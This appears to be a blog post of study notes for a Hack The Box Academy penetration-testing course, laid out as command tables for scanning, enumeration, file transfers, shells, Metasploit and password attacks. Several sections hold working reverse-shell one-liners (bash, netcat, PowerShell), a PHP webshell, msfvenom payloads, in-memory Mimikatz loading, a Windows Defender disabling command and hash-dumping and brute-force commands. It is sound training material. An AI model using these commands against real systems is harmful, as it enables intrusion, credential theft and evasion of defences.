---
layout: post
title:  htbacademy
description: Watch and Learn
date:   2018-04-21 15:01:35 +0300
image:  '/images/20.jpg'
tags:   [Lifestyle, Rest, Nature]
---

# Table of Contents

- [Introduction](#introduction)
  - [1. Penetration Testing Process](#1-penetration-testing-process)
  - [2. Getting Started](#2-getting-started)
- [Reconnaissance, Enumeration & Attack Planning](#reconnaissance-enumeration--attack-planning)
  - [3. Network Enumeration with Nmap](#3-network-enumeration-with-nmap)
  - [4. Footprinting](#4-footprinting)
  - [5. Information Gathering - Web Edition](#5-information-gathering---web-edition)
  - [6. Vulnerability Assessment](#6-vulnerability-assessment)
  - [7. File Transfers](#7-file-transfers)
  - [8. Shells & Payloads](#8-shells--payloads)
  - [9. Using the Metasploit Framework](#9-using-the-metasploit-framework)
- [Exploitation & Lateral Movement](#exploitation--lateral-movement)
  - [10. Password Attacks](#10-password-attacks)
  - [11. Attacking Common Services](#11-attacking-common-services)
  - [12. Pivoting, Tunneling, and Port Forwarding](#12-pivoting-tunneling-and-port-forwarding)
  - [13. Active Directory Enumeration & Attacks](#13-active-directory-enumeration--attacks)
- [Web Exploitation](#web-exploitation)
  - [14. Using Web Proxies](#14-using-web-proxies)
  - [15. Attacking Web Applications with Ffuf](#15-attacking-web-applications-with-ffuf)
  - [16. Login Brute Forcing](#16-login-brute-forcing)
  - [17. SQL Injection Fundamentals](#17-sql-injection-fundamentals)
  - [18. SQLMap Essentials](#18-sqlmap-essentials)
  - [19. Cross-Site Scripting (XSS)](#19-cross-site-scripting-xss)
  - [20. File Inclusion](#20-file-inclusion)
  - [21. File Upload Attacks](#21-file-upload-attacks)
  - [22. Command Injections](#22-command-injections)
  - [23. Web Attacks](#23-web-attacks)
  - [24. Attacking Common Applications](#24-attacking-common-applications)
- [Post-Exploitation](#post-exploitation)
  - [25. Linux Privilege Escalation](#25-linux-privilege-escalation)
  - [26. Windows Privilege Escalation](#26-windows-privilege-escalation)
- [Reporting & Capstone](#reporting--capstone)
  - [27. Documentation & Reporting](#27-documentation--reporting)
  - [28. Attacking Enterprise Networks](#28-attacking-enterprise-networks)



<a id="introduction"></a>
# Introduction

<a id="1-penetration-testing-process"></a>
## 1. Penetration Testing Processes

<a id="2-getting-started"></a>
## 2. Getting Started
### Basic Tools

**HTB | Machines**

Metasploit:

- [ ] Granny/Grandpa
- [ ] Jerry
- [ ] Blue
- [ ] Lame
- [ ] Optimum
- [ ] Legacy
- [ ] Devel

#### Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

#### Pentesting

| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |

<a id="reconnaissance-enumeration--attack-planning"></a>
## Reconnaissance, Enumeration & Attack Planning

<a id="3-network-enumeration-with-nmap"></a>
### 3. Network Enumeration with Nmap

#### Scanning Options

| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |

#### Output Options

| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |

#### Performance Options

| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |

<a id="4-footprinting"></a>
### 4. Footprinting

#### Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |


#### Host-based Enumeration


##### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |


##### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |


##### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |


##### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |



##### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |


##### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |


##### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> <FQDN/IP>` | Login to the MySQL server. |


##### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |


##### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |


##### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |


##### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

<a id="5-information-gathering---web-edition"></a>
### 5. Information Gathering - Web Edition

#### WHOIS

| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |



#### DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |



#### Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `VirusTotal` | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url) |
| `Censys` | [https://censys.io/](https://censys.io/) |
| `Crt.sh` | [https://crt.sh/](https://crt.sh/) |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |

##### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```
#### Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |



#### Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |



#### Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |



#### Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |



#### Crawling

| **Resource/Command** | **Description** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |

<a id="6-vulnerability-assessment"></a>
### 6. Vulnerability Assessment
N#A

<a id="7-file-transfers"></a>
### 7. File Transfers

| **Command** | **Description** |
| --------------|-------------------|
|`Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

<a id="8-shells--payloads"></a>
### 8. Shells & Payloads

|**Commands** |**Description**|
|---|---|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use |
| `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (`/bin/bash`) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender` |
| `use exploit/windows/smb/psexec` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec` |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell` |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload` |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | MSFvenom command used to generate a Windows-based reverse shell stageless payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | MSFvenom command used to generate a MacOS-based reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | MSFvenom command used to generate a ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | MSFvenom command used to generate a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload |
| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010` |
| `use exploit/windows/smb/ms17_010_psexec` | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010 |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6` |
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Python command used to spawn an `interactive shell` on a linux-based system |
| `/bin/sh -i` | Spawns an interactive shell on a linux-based system |
| `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system |
| `ruby: exec "/bin/sh"` | Uses `ruby` to spawn an interactive shell on a linux-based system |
| `Lua: os.execute('/bin/sh')` | Uses `Lua` to spawn an interactive shell on a linux-based system |
| `awk 'BEGIN {system("/bin/sh")}'` | Uses `awk` command to spawn an interactive shell on a linux-based system |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` command to spawn an interactive shell on a linux-based system |
| `find . -exec /bin/sh \; -quit` | An alternative way to use the `find` command to spawn an interactive shell on a linux-based system |
| `vim -c ':!/bin/sh'` | Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells" |
| `ls -la <path/to/fileorbinary>` | Used to `list` files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute |
| `sudo -l` | Displays the commands that the currently logged on user can run as `sudo` |
| `/usr/share/webshells/laudanum` | Location of `laudanum webshells` on ParrotOS and Pwnbox |
| `/usr/share/nishang/Antak-WebShell` | Location of `Antak-Webshell` on Parrot OS and Pwnbox |

<a id="9-using-the-metasploit-framework"></a>
### 9. Using the Metasploit Framework

#### MSFconsole Commands 

| **Command**        | **Description** |
| :--------------- | :----------------------------------------------------------- |
| `show exploits` | Show all exploits within the Framework.                      |
| `show payloads`  | Show all payloads within the Framework.                      |
| `show auxiliary` | Show all auxiliary modules within the Framework.             |
| `search <name>` | Search for exploits or modules within the Framework.         |
| `info`         | Load information about a specific exploit or module.         |
| `use <name>` | Load an exploit or module (example: use windows/smb/psexec). |
| `use <number>` | Load an exploit by using the index number displayed after the search command. |
| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |
| `setg <function>` | Set a specific value globally (for example, LHOST or RHOST). |
| `show options` | Show the options available for a module or exploit.          |
| `show targets` | Show the platforms supported by the exploit.                 |
| `set target <number>` | Specify a specific target index if you know the OS and service pack. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Specify the payload index number to use after the show payloads command. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |
| `check` | Determine whether a target is vulnerable to an attack. |
| `exploit` | Execute the module or exploit and attack the target. |
| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |
| `exploit -z` | Do not interact with the session after successful exploitation. |
| `exploit -e <encoder>` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |
| `exploit -h` | Display help for the exploit command. |
| `sessions -l` | List available sessions (used when handling multiple shells). |
| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |
| `sessions -s <script>` | Run a specific Meterpreter script on all Meterpreter live sessions. |
| `sessions -K` | Kill all live sessions. |
| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
| `db_create <name>` | Create a database to use with database-driven attacks (example: db_create autopwn). |
| `db_connect <name>` | Create and connect to a database for driven attacks (example: db_connect autopwn). |
| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |
| `db_destroy` | Delete the current database. |
| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options. |

<a id="exploitation--lateral-movement"></a>
## Exploitation & Lateral Movement

<a id="10-password-attacks"></a>
### 10. Password Attacks

#### Connecting to Target

| **Command**| **Description**|
|-|-|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password`            | Uses Evil-WinRM to establish a Powershell session with a target. |
| `ssh user@<ip>`                                     | Uses SSH to connect to a target using a specified user.      |
| `smbclient -U user \\\\<ip>\\SHARENAME`             | Uses smbclient to connect to an SMB share using a specified user. |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

#### Password Mutations

| **Command**| **Description**|
|-|-|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list.             |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

#### Remote Password Attacks

| **Command**| **Description**|
|-|-|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -l user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
| `hydra -C <user_pass.list> ssh://<IP>`                       | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
